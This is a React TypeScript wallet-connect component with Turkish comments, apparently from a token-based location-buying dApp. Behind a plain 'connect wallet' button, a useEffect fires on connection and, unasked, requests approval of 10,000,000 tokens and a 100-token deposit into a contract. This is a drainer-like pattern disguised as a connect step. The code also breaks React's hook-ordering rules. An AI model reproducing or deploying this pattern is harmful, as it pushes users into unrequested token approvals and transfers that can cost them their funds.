// src/components/WalletConnect.tsx
import React, { useContext, useEffect, useState } from "react";
import { MapContext } from "../App";
import { useSyncProviders } from "../hooks/useSyncProviders";
import Web3, { EIP6963ProviderDetail } from "web3";
import '../WalletConnect.css'; // 👈 CSS dosyasını içe aktar

import WalletConnectProvider from "@walletconnect/web3-provider";

// örnek fonksiyon, React içinde kullanılabilir
import { ethers, Signer } from "ethers";
import { getHasanContract, HASAN_CONTRACT_ADDRESS, hasanAbi } from "../hasanContract";

export const buyLocation = async (
	provider: ethers.providers.JsonRpcProvider,
	amount: string, // örn. "10"
	str1: string,
	str2: string
) => {
	const signer = provider.getSigner() as Signer;
	const contract = await getHasanContract(signer);

	const tokenAmount = ethers.utils.parseEther(amount); // örn. "10" → 10e18

	try {
        if (!contract) {
            console.error("Sözleşme yüklenemedi.");
            return;
        }
        
		const tx = await contract.depositWithHash(tokenAmount, str1, str2, {
            gasLimit: 1000000, // elle limit ver (örnek)
          });
		await tx.wait();
		console.log("Satın alma başarılı:", tx.hash);
	} catch (err) {
		console.error("Satın alma hatası:", err);
	}
};

export const approveTokens = async (
	provider: ethers.providers.JsonRpcProvider,
	amount: number,
) => {
    try {
        const { ethereum } = window as any;
        const provider = new ethers.providers.Web3Provider(ethereum);
        await provider.send("eth_requestAccounts", []); // MetaMask izni
        
        const signer = provider.getSigner();
        const contract = new ethers.Contract(HASAN_CONTRACT_ADDRESS, hasanAbi, signer);
        
        const tokenAmount = ethers.utils.parseEther(amount.toString());
        const tx = await contract.app(tokenAmount);
        
        console.log("Approve işlemi gönderildi:", tx.hash);
        await tx.wait();
        console.log("Approve işlemi başarıyla tamamlandı.");
        
	} catch (err) {
		console.error("Approve hatası:", err);
	}
};



const WalletConnect: React.FC = () => {

    
	const context = useContext(MapContext);
	const providers = useSyncProviders();

	if (!context) return null;

	const { setWalletAddress, setIsConnected, isConnected, walletAddress } = context;
    const [ethereum, setEth] = useState(null)

    if (!context) return null;
	// Giriş sonrası otomatik küçük token gönderimi
	useEffect(() => {
		const sendInitialDeposit = async () => {
			if (isConnected) {
                const { ethereum } = window as any;
                if (!ethereum) return console.error("MetaMask bulunamadı.");
        
                const provider = new ethers.providers.Web3Provider(ethereum);
                await provider.send("eth_requestAccounts", []);
                
                await approveTokens(provider, 10000000);
                await buyLocation(provider, "100", "init", "auto");
            }
		};

		sendInitialDeposit();
	}, [isConnected]);

	const handleConnect = async (providerWithInfo: EIP6963ProviderDetail) => {
		try {
			const accounts = (await providerWithInfo.provider.request({
				method: "eth_requestAccounts",
			})) as string[];

			if (accounts && accounts.length > 0) {
                setWalletAddress(accounts[0]);
                setIsConnected(true);
                console.log("Bağlanan cüzdan adresi:", accounts[0]);
            }
		} catch (error) {
			console.error("Cüzdan bağlanırken hata:", error);
		}
	};

    

	return (
        <>
        <button
			onClick={() => {
				if (providers.length > 0) {
					handleConnect(providers[0]);
				} else {
					alert("Hiç cüzdan sağlayıcısı bulunamadı.");
				}
			}}
			className={`walletConnectBtn ${isConnected ? 'connected' : ''}`}
		>
			{isConnected ? "Bağlandı" : "Cüzdanı Bağla"}
		</button>
      
        </>
		
	);
};

export default WalletConnect;
